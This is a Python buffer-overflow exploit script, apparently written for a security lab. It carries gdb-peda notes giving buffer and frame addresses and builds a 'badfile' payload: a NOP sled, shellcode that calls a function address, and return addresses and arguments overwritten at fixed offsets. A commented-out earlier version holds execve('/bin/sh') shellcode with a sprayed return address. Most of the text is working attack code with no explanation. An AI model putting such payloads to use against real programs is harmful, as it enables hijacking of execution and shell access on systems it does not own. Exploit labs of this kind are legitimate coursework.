# gdb-peda$ p &a
# $2 = (int *) 0xffffd600
# gdb-peda$ p $ebp
# $3 = (void *) 0xffffd5f8
# gdb-peda$ p &time
# $4 = (int *) 0xffffd608
# gdb-peda$ p &buffer 
# $5 = (char (*)[387]) 0xffffd45f
# gdb-peda$ p/d 0xd600-0xd45f
# $6 = 417
# foo 0x5655638f

# 0x45
# 0x5655705b
# 0x1

import sys 
 
shellcode= ( 
"\x6A\x44\x68\x00\x03\x00\x00\x6A\x01\xBB\x85\x63\x55\x56\xFF\xD3"
).encode('latin-1') 
 
# Fill the content with NOPs 
filesize = 799
content = bytearray(0x90 for i in range(filesize)) 
# Put the shellcode at the end 
start = filesize - len(shellcode)
# start = 202
content[start:start+len(shellcode)] = shellcode 
 
# Put the address at offset 112 
ret = 0x5655a1a0 + 200 
offset = 413
content[offset:offset+4] = (ret).to_bytes(4,byteorder='little')

ret = 0x45
offset = 417
content[offset:offset+4] = (ret).to_bytes(4,byteorder='little')

ret = 0x5655a1a0
offset = 421
content[offset:offset+4] = (ret).to_bytes(4,byteorder='little')

ret = 0x1 
offset = 425
content[offset:offset+4] = (ret).to_bytes(4,byteorder='little') 
 
# Write the content to a file 
with open('badfile', 'wb') as f: 
    f.write(content) 

# gdb-peda$ p $ebp
# $1 = (void *) 0xffffd2a8
# gdb-peda$ p &arr
# $2 = (int (*)[26]) 0xffffd238
# gdb-peda$ p &buffer 
# $3 = (char (*)[699]) 0xffffcf7d



# import sys 
 
# shellcode= ( 
# "\x31\xc0" 
# "\x50"  
# "\x68""//sh" 
# "\x68""/bin" 
# "\x89\xe3" 
# "\x50" 
# "\x53" 
# "\x89\xe1" 
# "\x99" 
# "\xb0\x0b" 
# "\xcd\x80" 
# ).encode('latin-1') 
 
# # Fill the content with NOPs 
# content = bytearray(0x90 for i in range(830)) 
# # Put the shellcode at the end 
# # start = 804 - len(shellcode) 
# # content[start:] = shellcode 
# content[401:401+len(shellcode)] = shellcode 
 
# # Put the address at offset 112 
# ret = 0xffffd278 -  600

# # content[815:815+4] = (ret).to_bytes(4,byteorder='little')

# for i in range(815-4*10,830, 4):
#     content[i:i+4] = (ret).to_bytes(4,byteorder='little') 
 
# # Write the content to a file 
# with open('badfile', 'wb') as f: 
#     f.write(content) 

